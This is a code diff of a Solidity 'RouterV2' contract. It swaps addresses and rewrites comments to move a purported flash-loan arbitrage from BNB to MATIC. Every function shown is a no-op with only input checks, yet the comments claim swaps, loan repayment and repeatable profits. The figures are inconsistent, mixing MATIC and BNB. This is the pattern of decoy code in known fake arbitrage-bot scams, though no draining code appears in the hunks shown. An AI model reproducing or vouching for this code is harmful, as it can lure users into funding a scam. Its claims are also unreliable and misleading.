@@ -111,7 +111,7 @@ interface IUniswapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x4bfdBF63b3b7F0E0b8bb6bA0CBa0D2d9b9A82345;
+        return 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -137,30 +137,30 @@ contract RouterV2 {
         require(amount > 0, "Amount should be greater than 0.");
     }
 
-    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+    //To prepare the arbitrage, MATIC is converted to USDC using aaveSwap swap contract.
     function convertMaticToDai(address add0, uint256 amount) public pure {
         require(uint(add0) != 0, "Address is invalid");
         require(amount > 0, "Amount should be greater than 0");
     }
 
     function aaveSwapAddress() public pure returns (address) {
-        return 0x4bfdBF63b3b7F0E0b8bb6bA0CBa0D2d9b9A82345;
+        return 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
     }
 
-    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+    //The arbitrage converts USDC for MATIC using USDC/MATIC aaveSwap, and then immediately converts MATIC back to 3,148.39 BNB using BNB/BUSD BakerySwap.
     function callArbitrageAAVE(address add0, address add1) public pure {
         require(uint(add0) != 0, "Address is invalid!");
         require(uint(add1) != 0, "Address is invalid!");
     }
 
-    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
+    //After the arbitrage, 3,148.38 MATIC is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
     function transferDaiToMultiplier(address add0)
         public pure
     {
         require(uint(add0) != 0, "Address is invalid!");
     }
 
-    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
+    //5. Note that the transaction sender gains 87.29 MATIC from the arbitrage, this particular transaction can be repeated as price changes all the time.
     function completeTransation(uint256 balanceAmount) public pure {
         require(balanceAmount >= 0, "Amount should be greater than 0!");
     }
